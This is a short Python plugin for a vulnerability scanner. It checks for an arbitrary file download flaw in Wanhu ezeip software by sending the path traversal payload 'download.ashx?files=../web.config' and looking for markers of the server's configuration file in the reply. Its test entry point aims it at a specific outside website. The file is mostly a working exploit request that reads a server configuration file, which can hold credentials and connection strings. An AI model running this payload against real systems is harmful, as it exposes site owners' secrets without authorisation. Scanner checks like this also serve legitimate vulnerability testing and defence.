#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Warsong
#_PlugName_ = 万户ezeip任意文件下载
#_Function_ = 插件格式
#_FileName_ = whezeip_Download_Anything.py
def assign(service, arg):
    if service == "whezeip": 
        return True, arg 

def audit(arg):

    payload='download.ashx?files=../web.config'
    url=arg+payload
    code,head,body,errcode,fina_url=curl.curl(url)
    if code == 200 and 'rootRollingFile' in body and 'cachingConfiguration' in body:
        security_warning(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://www.zsty.org/')[1])